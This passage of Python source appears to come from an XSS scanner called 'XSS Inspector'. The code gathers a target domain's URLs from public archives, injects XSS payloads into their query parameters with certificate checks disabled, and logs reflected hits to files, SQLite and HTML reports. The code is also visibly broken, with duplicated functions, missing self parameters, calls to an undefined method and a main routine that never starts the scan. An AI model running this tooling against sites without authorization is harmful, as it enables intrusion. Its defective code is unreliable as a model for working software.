            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                try:
                    response = requests.get(test_url, verify=False, timeout=3)
                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")                        
                        successful_payloads.append((test_url, "Heuristic Test"))
                        self.save_to_text_file(test_url)
                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL} during heuristic refinement for {test_url}: {e}")

            return successful_payloads


        # Test each payload against the filtered parameters
        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
        for param in filtered_params:
            for payload in selected_filters:
                payload_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(payload_url, verify=False, timeout=3)

                    if response.status_code == 200 and payload in response.text:
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
                        successful_payloads.append((payload_url, payload))  # Collect successful payloads
                    else:
                        failed_payloads.append((payload_url, payload))
                except requests.RequestException as e:
                    print(f"{Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for {payload_url}: {e}")

        if output_failed_payloads:
            for payload_url, payload in failed_payloads:
                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")

        return successful_payloads

def remove_duplicate_urls(file_path):
    try:
        # Read the file and get unique URLs
        with open(file_path, 'r') as file:
            urls = file.readlines()
            unique_urls = list(set(url.strip() for url in urls))
            unique_urls.sort()  # Optional: sort for better readability
        
        # Write back the unique URLs
        with open(file_path, 'w') as file:
            for url in unique_urls:
                file.write(f"{url}\n")
        
        print(f"File '{file_path}' cleaned. {len(unique_urls)} unique entries retained.")
    except Exception as e:
        print(f"Error: {e}")


def extract_from_sources(domain, want_subdomain, sources):
    """
    Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
    """
    final_url_list = set()
    wild_card = "*." if want_subdomain else ""

    # Iterate through the selected sources
    for source in sources:
        try:
            if source.lower() == "alienvault":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
                url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
                raw_urls = make_get_request(url, "json")
                if raw_urls and "url_list" in raw_urls:
                    for url_data in raw_urls["url_list"]:
                        final_url_list.add(url_data["url"])
            elif source.lower() == "wayback":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
                url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
                urls_list = make_get_request(url, "json")
                if urls_list:
                    for url in urls_list[1:]:  # Skip the header
                        final_url_list.add(url[0])
            elif source.lower() == "commoncrawl":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
                api_list = [
                    "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
                    "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
                ]
                for api in api_list:
                    url = f"{api}?url={wild_card+domain}/*&fl=url"
                    raw_urls = make_get_request(url, "text")
                    if raw_urls and ("No Captures found" not in raw_urls):
                        urls_list = raw_urls.split("\n")
                        final_url_list.update(url.strip() for url in urls_list if url.strip())
            else:
                print(f"[!] Unknown source: {source}")
        except Exception as e:
            print(f"[!] Error fetching from {source}: {e}")

    return list(final_url_list)


def save_extracted_urls(url_list):
    """
    Save extracted URLs to a dynamically named text file in the text folder.
    """
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        extracted_urls_filename = os.path.join(TEXT_FOLDER, f"extracted_urls_{timestamp}.txt")
        with open(extracted_urls_filename, 'w') as file:
            for url in url_list:
                file.write(url + "\n")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {extracted_urls_filename}")
    except OSError as e:
        print(f"Error saving extracted URLs: {e}")


def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                 dedupe_php_with_id=False, with_id_question_mark=False, output_file=None):
    """
    Reads a file with URLs, processes according to options, and returns usable URLs.

    Args:
        input_file (str): Path to the file containing URLs.
        php_only (bool): Extract only URLs ending with .php.
        php_query (bool): Extract only URLs with query parameters up to '='.
        dedupe_php (bool): Deduplicate URLs based on `.php` filenames only.
        dedupe_php_with_id (bool): Deduplicate `.php` filenames while retaining query parameters up to '='.
        with_id_question_mark (bool): Auto-add a '?' to URLs containing '=' if missing, supports all extensions and endpoints.
        output_file (str, optional): File to save the processed URLs.

    Returns:
        list: A list of processed URLs.
    """
    # Supported extensions and common endpoints
    supported_extensions = [".php", ".asp", ".htm", ".html", ".aspx", ".jsp", ".cgi"]
    common_endpoints = [
        "search?q=", "q?=", "id?=", "filter?q=", "query?=",
        "name?=", "key?=", "page?=", "action?q=", "term?q=",
        "login?", "signup?", "view?id=", "browse?q="
    ]
    scheme_regex = re.compile(r"^https?://")
    embedded_url_regex = re.compile(r'"url":\s*"([^"]+)"')

    usable_urls = set()
    processed_urls = set()  # To avoid duplicate results
    php_query_urls = {}

    # Read URLs from the input file
    with open(input_file, 'r') as file:
        for line in file:
            line = line.strip()

            # Extract embedded URLs if present
            embedded_match = embedded_url_regex.search(line)
            if embedded_match:
                line = embedded_match.group(1)

            # Validate the scheme and parse the URL
            if scheme_regex.match(line):
                parsed = urlparse(line)
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                # Process URLs based on extensions
                if any(clean_url.endswith(ext) for ext in supported_extensions):
                    usable_urls.add(clean_url)

                # Handle `php_only` option
                if php_only and clean_url.endswith(".php"):
                    processed_urls.add(clean_url)

                # Handle `php_query` option
                elif php_query and clean_url.endswith(".php") and parsed.query:
                    query_param = parsed.query.split("&")[0]
                    if "=" in query_param:
                        param_part = f"{clean_url}?{query_param.split('=')[0]}="
                        php_query_urls[clean_url] = param_part

                # Handle `dedupe_php` option
                elif dedupe_php and clean_url.endswith(".php"):
                    base_url = clean_url.split(".php")[0] + ".php"
                    processed_urls.add(base_url)

                # Handle `dedupe_php_with_id` option
                elif dedupe_php_with_id and clean_url.endswith(".php"):
                    if parsed.query:
                        query_param = parsed.query.split("&")[0]
                        if "=" in query_param:
                            param_part = f"{clean_url}?{query_param.split('=')[0]}="
                            php_query_urls[clean_url] = param_part
                    else:
                        processed_urls.add(clean_url.split(".php")[0] + ".php")

                # Handle `with_id_question_mark` option
                elif with_id_question_mark:
                    # Add `?` if missing for URLs containing `=` or matching common endpoints
                    if "=" in parsed.query or any(endpoint in line for endpoint in common_endpoints):
                        if "?" not in line and "=" in line:
                            modified_url = line.replace("=", "?=")
                        else:
                            modified_url = line
                        processed_urls.add(modified_url)

    # Combine results based on the selected option
    if php_only:
        results = sorted(processed_urls)
    elif php_query:
        results = sorted(php_query_urls.values())
    elif dedupe_php:
        results = sorted(processed_urls)
    elif dedupe_php_with_id:
        results = sorted(php_query_urls.values())
    elif with_id_question_mark:
        results = sorted(processed_urls)
    else:
        results = sorted(usable_urls)

    # Save to output file if specified
    if output_file:
        with open(output_file, 'w') as out_file:
            for url in results:
                out_file.write(url + '\n')

    return results

def get_arguments():
    # Create the argument parser with RawTextHelpFormatter to preserve formatting
    parser = argparse.ArgumentParser(
        description=f"""
{BLUE}{r"""XSS Inspector v.0.1 | Advanced URL Processor: v.0.0.1 | Add-ons: v.0.0.1 | Obfuscation: 96 Filters | Core Version: v.0.1"""}{END}
{MAGENTA}{r"""Programmed by: Haroon Ahmad Awan (haroon@cyberzeus.pk)"""}{END}
        """,
        formatter_class=argparse.RawTextHelpFormatter  # This ensures your formatting is preserved
    )
    # URL Processing Options
    url_processing = parser.add_argument_group('\033[96mURL Processing Options\033[0m')
    url_processing.add_argument(
        "--input",
        dest="input",
        help="\033[93m                      Specify the input file containing URLs for processing.\033[0m",
        required=False
    )
    url_processing.add_argument(
        "--output",
        dest="output",
        help="\033[93m                      Specify the file path to save processed URLs or vulnerability scan results.\033[0m",
        required=False
    )
    url_processing.add_argument(
        "--php-only",
        action="store_true",
        help="\033[93m                      Extract URLs ending with '.php' only, excluding parameters or queries.\033[0m"
    )
    url_processing.add_argument(
        "--php-query",
        action="store_true",
        help="\033[93m                      Extract URLs with '.php' filenames and include query parameters up to '='.\033[0m"
    )
    url_processing.add_argument(
        "--dedupe-php",
        action="store_true",
        help="\033[93m                      Remove duplicate URLs with '.php' filenames, retaining only unique entries.\033[0m"
    )
    url_processing.add_argument(
        "--dedupe-php-with-id",
        action="store_true",
        help="\033[93m                      Remove duplicate '.php' filenames while retaining their query parameters.\033[0m"
    )
    url_processing.add_argument(
        "--with-id-question-mark",
        action="store_true",
        help="\033[93m                      Ensure '=' URLs include a '?' when query parameters are present.\033[0m"
    )

    # XSS Inspector Options
    xss_inspector = parser.add_argument_group('\033[96mFine Tuning\033[0m')
    xss_inspector.add_argument(
        "--thread",
        dest="thread",
        type=int,
        help="\033[93m                      Set the number of threads for URL testing (default: 50).\033[0m",
        default=50
    )
    xss_inspector.add_argument(
        "--extract-to-file",
        dest="extract_to_file",
        help="\033[93m                      Extract discovered URLs to a specified text file.\033[0m",
        default=None
    )
    xss_inspector.add_argument(
        "--use-filters",
        dest="use_filters",
        type=int,
        help="\033[93m                      Limit the number of WAF filters to be used from the top of the list.\033[0m",
        default=None
    )
    xss_inspector.add_argument(
        "--skip-duplicate",
        dest="skip_duplicate",
        type=int,
        help="\033[93m                      Ignore URLs tested more than the specified number of times (default: 10).\033[0m",
        default=10
    )
    xss_inspector.add_argument(
        "--subs",
        dest="want_subdomain",
        action="store_true",
        help="\033[93m                      Include URLs from subdomains in the scan results.\033[0m"
    )
    xss_inspector.add_argument(
        "--deepcrawl",
        dest="deepcrawl",
        action="store_true",
        help="\033[93m                      Enable deep crawling using all CommonCrawl APIs (may take additional time).\033[0m"
    )
    xss_inspector.add_argument(
        "--report",
        dest="report_file",
        help="\033[93m                      Generate a detailed HTML report of the results.\033[0m",
        default=None
    )
    xss_inspector.add_argument(
        "--sources",
        dest="sources",
        help="\033[93m                      Specify data sources for crawling (alienvault, wayback, commoncrawl; default: all).\033[0m",
        default="all"
    )
    xss_inspector.add_argument(
        "--test-links",
        dest="test_links",
        help="\033[93m                      Limit the number of links to test (e.g., 10, 20, 30, or 'all').\033[0m",
        default="all"
    )
    xss_inspector.add_argument(
        "--duration",
        dest="duration",
        type=int,
        help="\033[93m                      Specify the duration (in seconds) to run the scan before stopping.\033[0m"
    )
    xss_inspector.add_argument(
        "--use-extracted-file",
        dest="use_extracted_file",
        help="\033[93m                      Use previously extracted URLs from a specified file.\033[0m",
        default=None
    )

    # Mandatory Arguments
    required_arguments = parser.add_argument_group('\033[91mScan Arguments\033[0m')
    required_arguments.add_argument(
        "--list",
        dest="url_list",
        help="\033[91m                      Provide a file containing a list of URLs (e.g., google_urls.txt).\033[0m",
        required=False
    )
    required_arguments.add_argument(
        "--domain",
        dest="domain",
        help="\033[91m                      Specify the target domain for vulnerability assessment (e.g., testphp.vulnweb.com).\033[0m",
        required=False
    )

    return parser.parse_args()

def main():
    args = get_arguments()

    try:
        # Ensure at least one input method is provided
        if not (args.input or args.use_extracted_file or args.domain or args.url_list):
            raise ValueError("No input source provided. Use --input, --use-extracted-file, --domain, or --list to specify input.")

        if args.input:
            print(f"\033[96mProcessing URLs from:\033[0m {args.input}")
            # Call process_urls with correct arguments
            processed_urls = process_urls(
                input_file=args.input,
                php_only=args.php_only,
                php_query=args.php_query,
                dedupe_php=args.dedupe_php,
                dedupe_php_with_id=args.dedupe_php_with_id,
                with_id_question_mark=args.with_id_question_mark,
                output_file=args.output
            )

            # Output results
            if args.output:
                print(f"\033[92mProcessed URLs saved to {args.output}\033[0m")
            else:
                print("\033[92mProcessed URLs:\033[0m")
                for url in processed_urls:
                    print(url)
        elif args.use_extracted_file:
            print(f"\033[96mUsing extracted file:\033[0m {args.use_extracted_file}")
            # Process URLs from the extracted file
            final_url_list = readTargetFromFile(args.use_extracted_file)
            print(f"\033[92mLoaded {len(final_url_list)} URLs from {args.use_extracted_file}\033[0m")
        elif args.domain:
            print(f"\033[96mCollecting URLs for domain:\033[0m {args.domain}")
            # Extract URLs from the domain
            sources = args.sources.split(",") if args.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
            final_url_list = extract_from_sources(args.domain, args.want_subdomain, sources)
        elif args.url_list:
            print(f"\033[96mProcessing URL list from file:\033[0m {args.url_list}")
            # Process URLs from the provided list
            final_url_list = readTargetFromFile(args.url_list)
        else:
            print(f"[!] Invalid input source. Use --help for usage instructions.")
            sys.exit(1)

    except ValueError as ve:
        print(f"\033[91mInput Error: {ve}\033[0m")
        sys.exit(1)
    except FileNotFoundError as fnf_error:
        print(f"\033[91mFile not found: {fnf_error}\033[0m")
        sys.exit(1)
    except Exception as e:
        print(f"\033[91mError during processing: {str(e)}\033[0m")
        sys.exit(1)

def make_get_request(url, response_type="json"):
    """
    Utility function to make GET requests and handle responses.
    """
    retries = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, timeout=3, verify=False)
            if response.ok:
                return response.json() if response_type.lower() == "json" else response.text
        except requests.RequestException as e:
            print(f"Attempt {attempt + 1} failed for {url}: {e}")
        time.sleep(2)
    print(f"Failed to fetch {url} after {retries} attempts.")
    return None


def save_extracted_urls_to_file(url_list, output_file):
    """
    Save extracted URLs to the specified .txt file.
    """
    try:
        with open(output_file, 'w') as file:
            for url in url_list:
                file.write(url + "\n")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {output_file}")
    except OSError as e:
        print(f"Error saving extracted URLs: {e}")

def limit_links(url_list, limit):
    if limit == "all":
        return url_list
    try:
        limit = int(limit)
        return url_list[:limit]
    except ValueError:
        print(f"Invalid value for --test-links: {limit}. Using all links.")
        return url_list

def readTargetFromFile(filepath):
    urls_list = []
    with open(filepath, "r") as f:
        for urls in f.readlines():
            if urls.strip():
                urls_list.append(urls.strip())
    return urls_list


def store_vulnerabilities_in_sqlite(self):
    try:
        conn = sqlite3.connect('vulnerabilities.db')
        cursor = conn.cursor()
        # Create table if not exists
        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            url TEXT NOT NULL,
                            payload TEXT NOT NULL,
                            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                        )''')
        # Insert vulnerabilities
        for url, payload in self.vulnerable_urls:
            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
        conn.commit()
        conn.close()
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
    except Exception as e:
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )


def generate_report(self):
    try:
        env = Environment(loader=FileSystemLoader('.'))
        env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
        template = env.get_template('report_template.html')
        
        report_data = {
            'timestamp': current_time,
            'vulnerable_urls': self.vulnerable_urls,
            'total_links_audited': len(self.url_list),
            'total_vulnerabilities': len(self.vulnerable_urls)
        }

        report_html = template.render(report_data)
        with open(self.report_file, 'w') as report_file:
            report_file.write(report_html)
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}HTML report generated: {self.report_file} {Style.RESET_ALL}")
    except Exception as e:
        print(f"Error generating report: {e}")


def start(self):
    # Count and display the number of discovered links
    print(f"[{current_time}] Discovered {self.links_discovered} links.")
    print(f"[{current_time}] Now implementing logics to capture XSS vulnerabilities on given links")
    self.url_list = list(set(self.url_list))
    with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
        results = list(executor.map(self.scan_urls_for_xss, self.url_list))
        self.links_audited += len(self.url_list)  # Update links_audited
    self.vulnerable_urls = [url for sublist in results for url in sublist]
    if self.report_file:
        self.store_vulnerabilities_in_sqlite()
        self.generate_report()
    return self.vulnerable_urls
    
class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()

    def make_get_request(url, response_type="json"):
        """
        Utility function to make GET requests and handle responses.
        """
        retries = 3
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }

        for attempt in range(retries):
            try:
                response = requests.get(url, headers=headers, timeout=3, verify=False)
                if response.ok:
                    return response.json() if response_type.lower() == "json" else response.text
            except requests.RequestException as e:
                print(f"Attempt {attempt + 1} failed for {url}: {e}")
            time.sleep(2)
        print(f"Failed to fetch {url} after {retries} attempts.")
        return None

    def extract_from_sources(domain, want_subdomain, sources):
        """
        Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
        """
        final_url_list = set()
        wild_card = "*." if want_subdomain else ""

        # Iterate through the selected sources
        for source in sources:
            try:
                if source.lower() == "alienvault":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
                    url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
                    raw_urls = make_get_request(url, "json")
                    if raw_urls and "url_list" in raw_urls:
                        for url_data in raw_urls["url_list"]:
                            final_url_list.add(url_data["url"])
                elif source.lower() == "wayback":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
                    url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
                    urls_list = make_get_request(url, "json")
                    if urls_list:
                        for url in urls_list[1:]:  # Skip the header
                            final_url_list.add(url[0])
                elif source.lower() == "commoncrawl":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
                    api_list = [
                        "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
                        "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
                    ]
                    for api in api_list:
                        url = f"{api}?url={wild_card+domain}/*&fl=url"
                        raw_urls = make_get_request(url, "text")
                        if raw_urls and ("No Captures found" not in raw_urls):
                            urls_list = raw_urls.split("\n")
                            final_url_list.update(url.strip() for url in urls_list if url.strip())
                else:
                    print(f"[!] Unknown source: {source}")
            except Exception as e:
                print(f"[!] Error fetching from {source}: {e}")

        return list(final_url_list)



    def start(self):
        try:
            if self.deepcrawl:
                self.startDeepCommonCrawl()
            else:
                self.getCommonCrawlURLs(
                    self.domain,
                    self.want_subdomain,
                    ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"]
                )
        except Exception as e:
            print(f"[!] CommonCrawl failed: {e}. Switching to WaybackMachine and AlienVault.")

        try:
            wayback_urls = self.getWaybackURLs(self.domain, self.want_subdomain)
            self.final_url_list.update(wayback_urls)
        except Exception as e:
            print(f"[!] WaybackMachine failed: {e}. Moving to AlienVault.")

        try:
            alienvault_urls = self.getOTX_URLs(self.domain)
            self.final_url_list.update(alienvault_urls)
        except Exception as e:
            print(f"[!] AlienVault failed: {e}. Unable to fetch URLs.")

        self.url_list = list(self.final_url_list)
        return self.url_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        try:
            if want_subdomain:
                wild_card = "*."
            else:
                wild_card = ""
            final_urls_list = set()
            for api in apiList:
                url = f"{api}?url={wild_card+domain}/*&fl=url"
                raw_urls = self.make_GET_Request(url, "text")
                if raw_urls and ("No Captures found" not in raw_urls):
                    urls_list = raw_urls.split("\n")
                    final_urls_list.update(url.strip() for url in urls_list if url.strip())
            self.final_url_list.update(final_urls_list)
        except Exception as e:
            print(f"[!] Error fetching CommonCrawl URLs: {e}.")
            raise  # Ensure fallback triggers

    def getWaybackURLs(self, domain, want_subdomain):
        wild_card = "*." if want_subdomain else ""
        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        final_urls_list = set()
        if urls_list:
            for url in urls_list[1:]:  # Skip the header
                final_urls_list.add(url[0])
        return list(final_urls_list)

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        final_urls_list = set()
        if raw_urls and "url_list" in raw_urls:
            for url_data in raw_urls["url_list"]:
                final_urls_list.add(url_data["url"])
        return list(final_urls_list)
    
class XSSScanner:
    def __init__(self, domain, url_list, threadNumber, report_file, skip_duplicate, use_filters, payload=None, duration=None):
        self.url_list = url_list
        self.threadNumber = threadNumber
        self.domain = domain
        self.vulnerable_urls = []
        self.report_file = report_file
        self.payload = payload
        self.skip_duplicate = skip_duplicate
        self.use_filters = use_filters  # Number of filters to use
        self.url_test_counts = {}  # Dictionary to track URL test counts
        self.stop_scan = False
        self.links_discovered = len(url_list)  # Initialize links_discovered
        self.links_audited = 0  # Initialize links_audited
        self.duration = duration  # Duration to run the scan
        signal.signal(signal.SIGINT, self.handle_ctrl_c)
        if duration:
            timer_thread = threading.Thread(target=self.quit_after_duration)
            timer_thread.daemon = True
            timer_thread.start()


    import html

    def sanitize_payload(payload):
        """
        Sanitize payloads to neutralize potentially harmful scripts or code.
        """
        # Escape HTML special characters to prevent rendering
        sanitized_payload = html.escape(payload)
        # Replace potentially harmful functions with harmless text
        sanitized_payload = sanitized_payload.replace("alert", "[alert disabled]")
        sanitized_payload = sanitized_payload.replace("confirm", "[confirm disabled]")
        sanitized_payload = sanitized_payload.replace("eval", "[eval disabled]")
        return sanitized_payload

    def save_to_html_file(self, vulnerable_urls):
        """
        Save all vulnerable URLs and their payloads to a formatted HTML file.
        Includes options to download CSV and Excel files for Business Intelligence tools.
        """
        try:
            # Ensure the domain is set
            if not hasattr(self, 'domain') or not self.domain:
                self.domain = "Unknown Domain"

            # Create output folders if they do not exist
            OUTPUT_FOLDER = "reports"
            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
            os.makedirs(HTML_FOLDER, exist_ok=True)

            # Generate dynamic filenames based on current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")

            # Save data to CSV, Excel, and JSON files
            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
            df.to_csv(csv_file, index=False)
            df.to_excel(excel_file, index=False)
            df.to_json(json_file, orient="records", lines=True)
            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            # Generate the HTML report
            with open(html_file, "w") as file:
                file.write(
                    f"""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>XSS Vulnerabilities Report</title>
                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
                    {js_code}
                    {js_codeb}
                    {js_codec}
                    {js_coded}
                    {js_codee}
                    {js_codef}
                    {js_codeg}
                    {js_codeh}
                    {js_codei}
                    {js_codej}
                    {js_codek}
                    {js_codel}
                    {js_codem}
                    {js_coden}
                    {js_codeo}
                    {js_codep}
                    {js_codeq}
                    </head>
                    <body>
                        <div class="container py-5">
                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
                            
                            <div class="mb-4">
                                <h2>Summary</h2>
                                <div class="row">
                                    <div class="col-md-6">
                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
                                    </div>
                                    <div class="col-md-6">
                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
                                    </div>
                                </div>
                            </div>

                            <h2 class="mt-4">Vulnerable URLs</h2>
                            <table class="table table-bordered table-striped table-hover">
                                <thead class="table-dark">
                                    <tr>
                                        <th>#</th>
                                        <th>URL</th>
                                        <th>Payload</th>
                                    </tr>
                                </thead>
                                <tbody>
                    """
                )

                # Add table rows for each vulnerability
                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
                    sanitized_url = html.escape(payload_url)  # Escape the URL
                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
                    file.write(
                        f"""
                        <tr>
                            <td>{idx}</td>
                            <td>{sanitized_url}</td>
                            <td>{sanitized_payload}</td>
                        </tr>
                        """
                    )

                # Add download links and close HTML tags
                file.write(
                    f"""
                                </tbody>
                            </table>

                            <div class="mt-4">
                                <h3>Download Options</h3>
                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                )

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
        except Exception as e:
            print(f"Error saving to HTML file: {e}")



    def save_to_text_file(self, vulnerable_urls):
        """
        Save a payload URL to a dynamically named text file in the text folder.
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
            with open(vulnerable_urls_filename, 'a') as file:
                file.write(vulnerable_urls + "\n")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
        except OSError as e:
            print(f"Error saving vulnerable URL to text file: {e}")

    def store_vulnerabilities_in_sqlite(self):
        try:
            conn = sqlite3.connect('vulnerabilities.db')
            cursor = conn.cursor()
            # Create table if not exists
            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                                id INTEGER PRIMARY KEY AUTOINCREMENT,
                                url TEXT NOT NULL,
                                payload TEXT NOT NULL,
                                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                            )''')
            # Insert vulnerabilities
            for url, payload in self.vulnerable_urls:
                cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
            conn.commit()
            conn.close()
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
        except Exception as e:
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )



    def generate_report(self):
        try:
            env = Environment(loader=FileSystemLoader('.'))
            env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
            template = env.get_template('report_template.html')
            
